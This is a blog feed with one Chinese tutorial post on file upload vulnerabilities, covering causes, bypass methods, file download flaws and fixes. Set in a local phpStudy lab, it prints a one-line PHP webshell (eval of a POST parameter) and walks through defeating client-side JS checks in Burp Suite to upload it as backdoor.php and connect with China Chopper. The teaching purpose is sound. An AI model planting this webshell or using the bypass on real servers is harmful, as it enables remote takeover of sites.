<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://kiyomijin.github.io</id>
    <title>My Violet Eva Garden • Posts by &#34;文件上传漏洞探究&#34; tag</title>
    <link href="https://kiyomijin.github.io" />
    <updated>2022-10-02T16:34:47.000Z</updated>
    <category term="原创" />
    <category term="SQL注入探究" />
    <category term="文件上传漏洞探究" />
    <category term="数据库安全" />
    <category term="CTF小训" />
    <category term="Misc" />
    <entry>
        <id>https://kiyomijin.github.io/2022/10/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/%E5%89%8D%E5%8F%B0JS%E9%AA%8C%E8%AF%81%E5%AE%A1%E8%AE%A1+%E7%BB%95%E8%BF%87/</id>
        <title>前台JS验证审计+绕过</title>
        <link rel="alternate" href="https://kiyomijin.github.io/2022/10/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/%E5%89%8D%E5%8F%B0JS%E9%AA%8C%E8%AF%81%E5%AE%A1%E8%AE%A1+%E7%BB%95%E8%BF%87/"/>
        <content type="html">&lt;h1 id=&#34;文件上传漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#文件上传漏洞&#34;&gt;#&lt;/a&gt; 文件上传漏洞&lt;/h1&gt;
&lt;p&gt;在讲前台 JS 绕过之前，由于是文件上传漏洞探究系列的第一讲，先来简单介绍一下文件上传漏洞。&lt;/p&gt;
&lt;h2 id=&#34;文件上传漏洞的原因&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#文件上传漏洞的原因&#34;&gt;#&lt;/a&gt; 文件上传漏洞的原因&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;对于上传文件的后缀名 (扩展名) 没有做较为严格的限制&lt;/li&gt;
&lt;li&gt;对于上传文件的 MIMETYPE (content-type，用于描述文件类型的一种描述方法)，没有做检查&lt;/li&gt;
&lt;li&gt;权限上没有对于上传的文件目录设置不可执行权限&lt;/li&gt;
&lt;li&gt;web server 对于上传文件或者指定目录的行为没有做限制。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;​	在 Web 中进行文件上传的原理是通过将表单设置为 &lt;code&gt;multipart/form-data&lt;/code&gt; ，同时加入文件域，而后通过 HTTP 协议将文件内容发送到服务器，服务器端读取这个分段（&lt;strong&gt;multipart&lt;/strong&gt;）的数据信息，并将其中的文件内容提取出来并保存。&lt;/p&gt;
&lt;p&gt;​	通常，在进行文件保存的时候，服务器端会读取文件的原始文件名，并从这个原始文件名中得出文件的扩展名，而后随机为文件起一个文件名（为了防止重复），并且加上原始文件的扩展名来保存到服务器上。&lt;/p&gt;
&lt;h2 id=&#34;文件上传漏洞的危害&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#文件上传漏洞的危害&#34;&gt;#&lt;/a&gt; 文件上传漏洞的危害&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;上传 web 木马文件、控制 web 服务器文件、远程命令执行等&lt;/li&gt;
&lt;li&gt;上传系统病毒、木马文件进行挖矿、僵尸网络&lt;/li&gt;
&lt;li&gt;上传系统溢出程序进行权限提升&lt;/li&gt;
&lt;li&gt;修改 web 页面实现钓鱼、挂马、暗链等操作&lt;/li&gt;
&lt;li&gt;内网渗透&lt;/li&gt;
&lt;li&gt;在权限得到提升的情况下，想做什么就做什么&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;文件上传合法性检测方法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#文件上传合法性检测方法&#34;&gt;#&lt;/a&gt; 文件上传合法性检测方法&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;前端 Js 验证&lt;/li&gt;
&lt;li&gt;MIME 类型验证&lt;/li&gt;
&lt;li&gt;黑名单 / 白名单&lt;/li&gt;
&lt;li&gt;检查文件内容 (getimagesize () 函数用于获取图像信息、校验关键字)&lt;/li&gt;
&lt;li&gt;禁止本地文件包含漏洞&lt;/li&gt;
&lt;li&gt;使用安全的 web 服务 (Apache、nginx (/test.png/xxx.php)、IIS 解析漏洞 (1.php;jpg))&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;文件上传漏洞8种常见绕过方法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#文件上传漏洞8种常见绕过方法&#34;&gt;#&lt;/a&gt; 文件上传漏洞 8 种常见绕过方法&lt;/h2&gt;
&lt;p&gt;（整体会有 20 多种，这里列举常见 8 种）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;前端 Js 绕过&lt;/li&gt;
&lt;li&gt;MIME 类型绕过&lt;/li&gt;
&lt;li&gt;后缀名大小写绕过 /php4、php5&lt;/li&gt;
&lt;li&gt;00 截断&lt;/li&gt;
&lt;li&gt;覆盖.htaccess&lt;/li&gt;
&lt;li&gt;Windows 文件流特性绕过&lt;/li&gt;
&lt;li&gt;双写文件名绕过&lt;/li&gt;
&lt;li&gt;条件竞争&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;文件下载漏洞概念&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#文件下载漏洞概念&#34;&gt;#&lt;/a&gt; 文件下载漏洞概念&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;一些网站由于业务需求，往往需要提供文件查看或文件下载功能，但若对用户查看或下载的文件不做限制，则恶意用户就能够查看或下载任意敏感文件，这就是文件查看与下载漏洞。&lt;/li&gt;
&lt;li&gt;下载服务器任意文件，如脚本代码、服务及系统配置文件等可用得到的代码进一步做代码审计，得到更多可利用漏洞。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;如何查找任意文件下载漏洞呢&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#如何查找任意文件下载漏洞呢&#34;&gt;#&lt;/a&gt; 如何查找任意文件下载漏洞呢？&lt;/h2&gt;
&lt;p&gt;查找传入文件名的参数：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;导入文件等参数，要是直接输入文件名，就有可能有注入点。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;注意如下几个参数名：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;RealPath, FilePath, filepath, Path, path, inputFile, url, urls, Lang, dis, data, readfile, filep&lt;/li&gt;
&lt;li&gt;src, menu, META-INF, WEB-INF&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;代码中如何查找漏洞：&lt;/p&gt;
&lt;p&gt;PHP 为例，有如下代码，就有可能存在任意文件下载漏洞&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;readfile&lt;/li&gt;
&lt;li&gt;fopen&lt;/li&gt;
&lt;li&gt;file_get_contents&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;windows敏感文件路径&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#windows敏感文件路径&#34;&gt;#&lt;/a&gt; Windows 敏感文件路径&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003011837881.png&#34; alt=&#34;image-20221003011837881&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;linux敏感文件路径&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#linux敏感文件路径&#34;&gt;#&lt;/a&gt; Linux 敏感文件路径&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003011901170.png&#34; alt=&#34;image-20221003011901170&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;修复文件下载漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#修复文件下载漏洞&#34;&gt;#&lt;/a&gt; 修复文件下载漏洞&lt;/h2&gt;
&lt;p&gt;PHP 为例：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;过滤.(点)，使用户在 url 种不能回溯上级目录&lt;/li&gt;
&lt;li&gt;正则严格判断用户输入参数的格式&lt;/li&gt;
&lt;li&gt;php.ini 配置 open_basedir 限定文件访问范围&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;OK，进入主题&lt;/p&gt;
&lt;h1 id=&#34;配置虚拟主机&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#配置虚拟主机&#34;&gt;#&lt;/a&gt; 配置虚拟主机&lt;/h1&gt;
&lt;p&gt;虚拟主机，能够将我们的多个 apache 做成域名的方式访问。&lt;/p&gt;
&lt;p&gt;打开 phpStudyB\Apache\conf\httpd.conf 文件，一共修改两处：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;取消 LoadModule 关于 vhost_alias 的注释&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003113249079.png&#34; alt=&#34;image-20221003113249079&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;取消 Virtual hosts 的 Include 所在行注释&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003113333330.png&#34; alt=&#34;image-20221003113333330&#34;&gt;&lt;/p&gt;
&lt;p&gt;再打开 C:\phpStudyB\Apache\conf\extra\httpd-vhosts.conf 文件&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003113809255.png&#34; alt=&#34;image-20221003113809255&#34;&gt;&lt;/p&gt;
&lt;p&gt;接下来就是重启 phpStudy 就行了。&lt;/p&gt;
&lt;h1 id=&#34;一句话木马&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#一句话木马&#34;&gt;#&lt;/a&gt; 一句话木马&lt;/h1&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt; @&lt;span class=&#34;keyword&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[abcd]);&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;简而言之，就是只有一句代码的木马。@eval 就是执行一些传的参数命令，$_POST 接收我们的 POST 请求，参数的名称是 abcd。总之，就是可以 &lt;code&gt;执行&lt;/code&gt; 我们发送的带参数的命令请求。&lt;/p&gt;
&lt;p&gt;功能是实现：数据库管理、生成虚拟终端、文件管理。&lt;/p&gt;
&lt;h1 id=&#34;前台js验证审计绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#前台js验证审计绕过&#34;&gt;#&lt;/a&gt; 前台 JS 验证审计 + 绕过&lt;/h1&gt;
&lt;h2 id=&#34;前台js验证审计&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#前台js验证审计&#34;&gt;#&lt;/a&gt; 前台 Js 验证审计&lt;/h2&gt;
&lt;p&gt;上传 backdoor.php (含有一句话木马)&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003124200976.png&#34; alt=&#34;image-20221003124200976&#34;&gt;&lt;/p&gt;
&lt;p&gt;ok，我们开始抓包&lt;/p&gt;
&lt;p&gt;启动 BurpSuit，intercept on，结果再次点击上传按钮，却没有抓到任何的包&lt;/p&gt;
&lt;p&gt;我们 F12 看源码进行代码审计&lt;/p&gt;
&lt;h3 id=&#34;上传按钮代码审计&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#上传按钮代码审计&#34;&gt;#&lt;/a&gt; 上传按钮代码审计&lt;/h3&gt;
&lt;p&gt;首先我们知道，重要的上传逻辑肯定在这些字样的附近：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003124524219.png&#34; alt=&#34;image-20221003124524219&#34;&gt;&lt;/p&gt;
&lt;p&gt;那么我们找到 &amp;quot;&lt;strong&gt; 上传区&lt;/strong&gt; &amp;quot;、&amp;quot;&lt;strong&gt; 请选择要上传的图片&lt;/strong&gt; &amp;quot; 这个字样，就能精准定位到相关源码附近。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003124332517.png&#34; alt=&#34;image-20221003124332517&#34;&gt;&lt;/p&gt;
&lt;p&gt;上面一段代码的主要逻辑：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;属于 &lt;code&gt;form&lt;/code&gt;  数据，使用 &lt;code&gt;POST&lt;/code&gt;  请求&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;有&lt;strong&gt;两个&lt;/strong&gt;输入 &lt;code&gt;input&lt;/code&gt; ：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;一个是 input_file，类型是 &lt;code&gt;file&lt;/code&gt; ，命名为 upload_file，意为待上传的文件。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;一个是 button，类型是 &lt;code&gt;submit&lt;/code&gt; ，命名为 submit，按钮名称为 “上传”&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;form&lt;/code&gt;  请求在点击 submit 时&lt;strong&gt;会触发的方法&lt;/strong&gt; —— &lt;code&gt;onsubmit&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;return checkFile ()：属于 &lt;code&gt;JavaScript(简称Js)&lt;/code&gt;  语法，意为将会调用 &lt;code&gt;checkFile()&lt;/code&gt; ，并将其结果返回&lt;/li&gt;
&lt;li&gt;&lt;code&gt;onsubmit&lt;/code&gt;  就是在提交之前&lt;strong&gt;验证上传文件的合法性，属于前端验证&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;好的，继续来看一下关键的 &lt;code&gt;checkFile()&lt;/code&gt;  函数都干了什么：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003125613717.png&#34; alt=&#34;image-20221003125613717&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;checkFile () 函数主要逻辑：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;通过 &lt;code&gt;getElementsByName()&lt;/code&gt;  函数，参数为 &lt;code&gt;upload_file&lt;/code&gt;  来获取其数组中第一个元素值 (下标从 0 开始)—— 也就是&lt;strong&gt; upload_file 对应的文件&lt;/strong&gt;。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;如果 &lt;code&gt;upload_file对应的文件&lt;/code&gt; 为空，那么就弹出 &amp;quot;请选择要上传的文件！&amp;quot;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;如果非空，则继续往下走&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;定义了允许上传的文件类型为 “.jpg| .png| .gif”&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;通过 lastIndexOf 函数获取 &lt;code&gt;最后一个.&lt;/code&gt;  出现的位置进行截取字符串，获得的是 &lt;code&gt;最后一个.&lt;/code&gt;  右边的字符串 ——&lt;strong&gt; 获得上传文件后缀名&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;判断 &lt;code&gt;上传文件后缀名&lt;/code&gt; 是否在刚刚定义的类型里面&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如果不在则弹出 “该文件不允许上传…”，并 return  &lt;code&gt;false&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;否则 return  &lt;code&gt;true&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;前台js验证绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#前台js验证绕过&#34;&gt;#&lt;/a&gt; 前台 Js 验证绕过&lt;/h2&gt;
&lt;p&gt;我们再次刷新上传页面，使用 BurpSuit 抓到页面返回的源码信息&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003130553004.png&#34; alt=&#34;image-20221003130553004&#34;&gt;&lt;/p&gt;
&lt;p&gt;直接找到刚刚定位的 checkFile () 函数，将其内容改成 &lt;code&gt;return true;&lt;/code&gt; ，意为&lt;strong&gt;无论什么文件，恒返回真&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003130644011.png&#34; alt=&#34;image-20221003130644011&#34;&gt;&lt;/p&gt;
&lt;p&gt;点击 &amp;quot;Forward&amp;quot; 按钮。&lt;/p&gt;
&lt;p&gt;然后上传我们的一句话木马，backdoor.php，点击 “上传”，之后就可以成功抓到包。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003130804344.png&#34; alt=&#34;image-20221003130804344&#34;&gt;&lt;/p&gt;
&lt;p&gt;之后一顿 Forward，提交过去。&lt;/p&gt;
&lt;p&gt;显示了我们上传的 php，即上传成功。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003130947145.png&#34; alt=&#34;image-20221003130947145&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们使用中国菜刀连接获取 webshell 即可。&lt;/p&gt;
</content>
        <category term="文件上传漏洞探究" />
        <updated>2022-10-02T16:34:47.000Z</updated>
    </entry>
</feed>
